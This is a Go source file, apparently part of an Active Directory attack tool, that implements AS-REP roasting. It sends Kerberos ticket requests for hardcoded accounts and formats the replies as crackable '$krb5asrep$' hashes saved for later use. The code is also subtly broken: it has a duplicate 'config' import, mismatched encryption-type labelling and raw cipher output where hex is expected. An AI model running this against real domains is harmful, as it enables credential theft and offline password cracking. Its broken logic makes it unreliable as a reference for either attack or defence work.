package kerberos

import (
	"fmt"
	"github.com/MKlolbullen/AD-plower/internal/config"
	"github.com/MKlolbullen/AD-plower/internal/workspace"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/etypeID"
	"github.com/jcmturner/gokrb5/v8/messages"
)

type ASREPResult struct {
	RoastableUsers []string
	Hashes         map[string]string
}

func RunASREPRoast(dc string) (*ASREPResult, error) {
	res := &ASREPResult{Hashes: make(map[string]string)}
	roastUsers := []string{"testuser", "svc_sql"}

	krb5conf := config.New()
	krb5conf.Realms = append(krb5conf.Realms, config.Realm{Realm: config.Cfg.Domain})

	for _, user := range roastUsers {
		cl := client.NewWithPassword(user, config.Cfg.Domain, "", krb5conf)
		cl.Realm = config.Cfg.Domain
		req, err := messages.NewASReqForTGT(cl.Credentials, cl.Config, cl.GetASReqOptions())
		if err != nil {
			continue
		}
		req.ReqBody.ETypes = []int32{etypeID.ET_AES256_CTS_HMAC_SHA1_96}
		rep, err := cl.SendASReq(req)
		if err == nil && rep.PVNO == 5 {
			hash := fmt.Sprintf("$krb5asrep$23$%s@%s:%s", user, config.Cfg.Domain, rep.EncPart.Cipher)
			res.Hashes[user] = hash
			res.RoastableUsers = append(res.RoastableUsers, user)
			fmt.Printf("✅ AS-REP roastable: %s\n", user)
		}
	}
	workspace.SaveRecon("kerberos", map[string]any{"asrep": res})
	return res, nil
}
